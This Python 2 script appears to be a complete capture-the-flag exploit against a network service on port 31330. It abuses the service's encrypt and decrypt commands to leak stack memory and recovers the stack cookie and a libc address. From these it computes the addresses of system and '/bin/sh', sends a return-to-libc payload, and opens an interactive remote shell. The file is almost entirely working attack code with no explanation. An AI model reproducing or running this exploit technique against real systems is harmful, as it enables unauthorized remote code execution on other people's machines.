import socket
from struct import pack,unpack
from ctypes import c_int32
import telnetlib
import time,random
import sys
import re

LOCAL = ('localhost',31330)
LOCAL = (sys.argv[1],31330)
# LOCAL = ('128.199.133.96',31331)
BUFFER = 4096


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(LOCAL)

def recv_until(str,debug=1):
    recv_ = ''
    while not str in recv_:
        tmp = s.recv(BUFFER)
        recv_ += tmp
        if debug:
            print tmp
        continue
    return recv_

recv_until('+\n')
s.send('w\n')
recv_until(':')
s.send('aa\n')
s.send('a\n')
recv_until(':')
s.send('aabbccddeeff001122334455667788aa\n')
s.recv(BUFFER)
s.send('a\n')
recv_until(':')
s.send('aabbccddeeff001122334455667788aaaabbccddeeff001122334455667788aaaabbccddeeff001122334455667788aa\n')
s.send('s\n')
print s.recv(BUFFER)
s.send('w\n')
recv_until(':')
s.send('aa\n')
s.send('d\n')
recv_until(':')
s.send('46afa30b62deeb8ea94059224dcdad4955cd9ec9ceff4aa1\n')
print s.recv(BUFFER)
s.send('w\n')
print s.recv(BUFFER)
s.send('a\n')
recv_until(':')
s.send('aa\n')
recv_until(':')
raw_input("?")

s.send('aabbccddeeff001122334455667788aaaabbccddeeff001122334455667788aaaabbccddeeff00ff00ff00eeff00ff00ff00eeff00ff00ff00eeff00ff00ff00eeff00ff00ff00eeff00ff00ff0000eeff00ff00ff0000eeff00ff00ff0000eeff00ff00ff00aabbccddeeffaabbccddeeff001122334455667788aaaabbccddeeff001122334455667788aaaabbccddeeff00ff00ff00eeff00ff00ff00eeff00ff00ff00eeff00ff00ff00eeff00ff00ff00eeff00ff00ff0000eeff00ff00ff0000eeff00ff00ff0000eeff00ff00ff00aabbccddeeffa\n')

data = recv_until('  ')
enc = re.findall(r'[0-9a-f]{80,}',data)[0]
s.send('d\n')
recv_until(':')
s.send(enc+'\n')
data = recv_until('  ')
dec = re.findall(r'[0-9a-f]{80,}',data)[0].decode('hex')

dec_int = []


for i in range(0,len(dec),4):
    x = unpack('<I',dec[i:i+4])[0]
    print hex(x)
    dec_int.append(x)

stack_cookie = dec_int[16]
libc = dec_int[22]
system = libc - 0x16acf0 # offset
binsh = libc - 0x4a7b4

print 'stack:',hex(stack_cookie)
print 'libc:',hex(libc)
print 'system:',hex(system)


raw_input("?")

enc_payload = ''
enc_payload += pack('<II',stack_cookie,0x41414141)
enc_payload += pack('<III',system,0x41414141,binsh)
enc_payload += ""
enc_payload += ""
payload = ''
payload += enc_payload.encode('hex').encode('hex')
payload = payload.ljust(512,'a')
s.send('a\n')
recv_until(':')
s.send(payload+'\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()



s.close()



